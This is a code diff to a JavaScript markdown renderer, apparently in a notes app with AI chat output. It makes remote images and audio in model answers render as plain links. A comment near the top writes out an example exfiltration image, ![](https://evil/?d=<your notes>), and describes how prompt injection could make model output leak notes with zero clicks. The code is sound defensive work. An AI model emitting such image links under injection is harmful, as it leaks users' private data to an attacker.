@@ -231,6 +231,26 @@ export function renderBlocksInlineWithContext(md, ctx = {}) {
   return withMarkdownRenderContext(ctx, () => renderBlocksInline(md));
 }
 
+/*
+  Render context flag `remoteMedia: 'link'` — for model output (chat
+  answers, Pulse cards). An image or audio URL loads the moment it
+  renders, so a prompt-injected ![](https://evil/?d=<your notes>) would
+  leak data with zero clicks. Such media become plain links instead.
+*/
+function blocksRemoteMedia(url) {
+  return currentRenderContext().remoteMedia === 'link' && /^https?:/i.test(String(url || ''));
+}
+
+function remoteMediaLink(url, label) {
+  let host = '';
+
+  try {
+    host = new URL(url).host;
+  } catch {}
+
+  return `<a class="pv-remote-media" href="${escapeAttr(url)}" target="_blank" rel="noopener noreferrer nofollow">${escapeHtml(decodeEntities(String(label)))}${host ? ` <small>(${escapeHtml(host)})</small>` : ''}</a>`;
+}
+
 export function classifyLine(line, ctx) {
   if (ctx.inFence) {
     if (/^```/.test(line)) return { type: 'fence', closes: true };
@@ -790,6 +810,10 @@ export function renderInline(s) {
       return stash(`<span class="pv-img-missing">blocked audio url</span>`);
     }
 
+    if (blocksRemoteMedia(safeAudio)) {
+      return stash(remoteMediaLink(safeAudio, alt || 'audio'));
+    }
+
     return stash(`<div class="pv-embed-audio" contenteditable="false">
       <audio controls preload="metadata" src="${escapeAttr(safeAudio)}"></audio>
     </div>`);
@@ -817,6 +841,10 @@ export function renderInline(s) {
 
     if (!safeImg) {
       return stash(`<span class="pv-img-missing">blocked image url</span>`);
+    }
+
+    if (blocksRemoteMedia(safeImg)) {
+      return stash(remoteMediaLink(safeImg, alt || 'image'));
     }
 
     const titleAttr = title
